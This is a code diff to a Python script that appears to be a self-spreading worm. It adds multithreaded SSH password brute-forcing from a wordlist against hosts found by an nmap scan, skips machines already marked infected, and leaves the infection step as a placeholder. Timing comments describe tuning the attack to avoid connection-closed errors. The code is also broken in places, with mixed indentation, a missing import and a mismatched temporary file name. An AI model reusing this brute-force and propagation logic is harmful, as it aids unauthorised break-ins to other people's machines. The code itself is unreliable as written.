@@ -1,9 +1,67 @@
 #! /usr/bin/env python3
-"""
-"""
 	
 from threading import Thread
 import socket
+import time
+
+#function called when dictionary attack found a password
+def passwordFoundCallback(password, sharedO):
+    sharedO.setFound(password)
+    print ("Found Password for host: " + sharedO.getHost() + " password: " + sharedO.getPassword())
+
+class sharedThings():
+    def __init__(self, host):
+        self.threadCound = 0
+        self.found = False
+		self.password = ""
+		self.host = host
+    def incthreadCount(self):
+        self.threadCound += 1
+    def decthreadCount(self):
+        self.threadCound -= 1
+    def getthreadCount(self):
+        return self.threadCound
+    def setFound(self, password):
+        self.found = True
+		self.password = password
+    def isFound(self):
+        return self.found
+	def getPassword(self):
+		return self.password
+	def getHost(self):
+		return self.host
+
+class BruteForceTask(Thread):
+    def __init__(self, host, password, sharedO):
+        Thread.__init__(self)
+
+		self.host = host
+		self.password = password
+		self.sharedO = sharedO
+
+
+    def run(self):
+        try:
+			tempPassFileScript = self.password + ".pass"
+            f = open(self.password, "w+")
+            f.write("echo " + tempPassFileScript)
+            f.close()
+            subprocess.check_output(["chmod", "+x", tempPassFileScript])
+            time.sleep(0.1)
+            print ("trying with password: " + self.password)
+            subprocess.check_output(["./ssh_session.sh", tempPassFileScript, self.host])
+            passwordFoundCallback(self.password, self.sharedO)
+        except:
+			pass
+			#different errors should be handled differently
+			#example of potential error:
+			#							- Permission denied (nothing to do here, this is normal. Bad username/password Combination)
+			#							- Connection closed (too many requests. We should try the password again and reduce the debit)
+			#							- Connection refused (the port isnt open)
+			#							- Other errors (the host isnt found and stuff)
+		finally:
+			subprocess.check_output(["rm", tempPassFileScript])
+			self.sharedO.decthreadCount()
 
 class SocketListener(Thread):
 
@@ -60,26 +118,34 @@ for entry in listedNmapString:
 	except:
 		errorOccured = True
 
-	bruteforced = False
+	threadLimit = 8 #this is experimentally the highest ive reached without getting connection closed error
+	sharedO = sharedThings(host) #used to mimic static variable. Used by processes to notice that they found a password
+							     #need an instance of sharedThings per attacked Host
+	#TODO: ssh root login is disabled on PIONE; Couldnt test PITWO since i cant find it
+	#TODO: the scan is currently broken. FIX IT!
+	if not errorOccured and dataDecoded == 'OK':
+		print('ErreurOccured = false, dataDecoded = OK')
+		print('Machine already infected. Passing to the next one...')
+		continue
 
-	if not errorOccured:
-		if dataDecoded != 'OK':
-			print('ErrorOccured = false, dataDecoded =/= OK')
-			print('Found a possible computer to infect. Trying to bruteforce the machine...')			
-			#Try to bruteforce the machine here
-			if bruteforced:
-				print('Infecting the machine...')
-				#Infect the machine here
-		else:
-			print('ErreurOccured = false, dataDecoded = OK')
-			print('Machine already infected. Passing to the next one...')
-	else:
-		print('ErrorOccured = true')
-		print('Found a possible computer to infect. Trying to infect the machine...')
-		#Try to infect machine here
-		if bruteforced:
-			print('Infecting the machine...')
-			#Infect the machine here
+
+	print('Found a possible computer to infect. Trying to bruteforce the machine...')
+	# we could parallelize each attack on hosts
+	# the bottleneck of the technique seems to be the time it takes to receive the answer from the attacked host
+	with open("./passwords.txt") as f:
+		for line in f:
+			t = BruteForceTask(host, line, sharedO)
+			t.start()
+			time.sleep(0.3)  # this is experimentally the fastest ive reached without getting connection closed error; may be different value for different hosts
+			sharedO.incthreadCount()
+			while threadLimit < sharedO.getthreadCount():
+				time.sleep(1)
+			if sharedO.isFound():
+				break
+	if sharedO.found:
+		password = sharedO.password
+		print('Infecting the machine...')
+		# Infect the machine here
 
 try:
 	onSenCaliss = input('Appuyez sur nimporte quel touche pour Quitter (DEBUGGING PURPOSES, A ENLEVER)')
